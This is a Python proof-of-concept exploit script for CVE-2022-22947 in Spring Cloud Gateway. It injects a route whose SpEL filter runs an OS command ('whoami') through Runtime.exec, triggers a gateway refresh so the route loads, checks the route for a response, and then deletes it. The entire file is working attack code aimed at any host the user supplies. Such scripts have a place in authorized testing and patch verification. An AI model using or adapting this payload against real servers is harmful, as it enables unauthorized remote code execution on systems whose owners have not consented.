import requests
import argparse
import json

headers = {"Content-Type": "application/json",
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
                   'Accept': '*/*'}

def delete(url):
    response = requests.delete(url=url,headers=headers,verify=False)
    if response.status_code == 200:
        print('Your malevolence route is deleted, take it easy~')
    else:
        print('Please delete your malevolence route manually~')

def interview(url):
    payurl = 'http://' + url + '/actuator/gateway/routes/wavesky'
    response = requests.get(url=payurl,headers=headers)
    if response.status_code == 200:
        print('It looks likely vulnerable')
        delete(payurl)
    else:
        print('It is strong')

def trigger(url):
    payurl ='http://' + url + '/actuator/gateway/refresh'
    response = requests.post(headers=headers,url=payurl,verify=False)
    try:
        if response.status_code == 200:
            interview(url)

    except Exception as e:
        print(e)
        pass

def exploit(url):
        payurl ='http://' + url + '/actuator/gateway/routes/wavesky'
        payload = {
            'id':'wavesky',
            'filters':[{'name':'AddResponseHeader','args':{'name':'Result','value':'#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}'}}],
            'uri':'http://example.com'
        }
        response = requests.post(url=payurl,data=json.dumps(payload),headers=headers,verify=False)
        try:
            if response.status_code == 201:
                trigger(url)

        except Exception as e:
            print(e)
            pass

if __name__ == '__main__':
    parameter = argparse.ArgumentParser(description='Poc CVE-2022-22947:')
    parameter.add_argument('--file',help='url file',required=False)
    parameter.add_argument('--url',help='ip:port',required=False)
    para = parameter.parse_args()

    if para.url:
        exploit(para.url)
        exit()
    else:
        parameter.print_help()
